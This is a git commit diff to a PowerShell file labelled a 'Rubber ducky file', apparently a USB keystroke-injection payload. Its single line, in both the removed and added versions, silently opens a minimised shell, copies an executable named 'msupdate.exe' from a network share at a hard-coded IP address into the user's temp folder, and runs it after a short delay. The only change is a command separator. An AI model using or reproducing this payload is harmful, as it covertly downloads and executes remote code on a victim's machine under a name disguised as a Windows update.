6636f600e5d566f2ecfda1c2ed714ab8e43d3bf5
Justin Perdok <justin-p@users.noreply.github.com>
2020-08-11 09:26:50 +0000

    Update d.ps1

--- d.ps1
+++ d.ps1
@@ -1,2 +1,2 @@
 # Rubber ducky file.
-C:\Windows\System32\cmd.exe /c start /min cmd /c "pushd \\5.200.18.86\download & copy msupdate.exe %userprofile%\appdata\local\temp & popd" & powershell.exe -c "start-sleep -s 10;%LOCALAPPDATA%\temp\msupdate.exe"
+C:\Windows\System32\cmd.exe /c start /min cmd /c "pushd \\5.200.18.86\download & copy msupdate.exe %userprofile%\appdata\local\temp & popd"; powershell.exe -c "start-sleep -s 10;%LOCALAPPDATA%\temp\msupdate.exe"
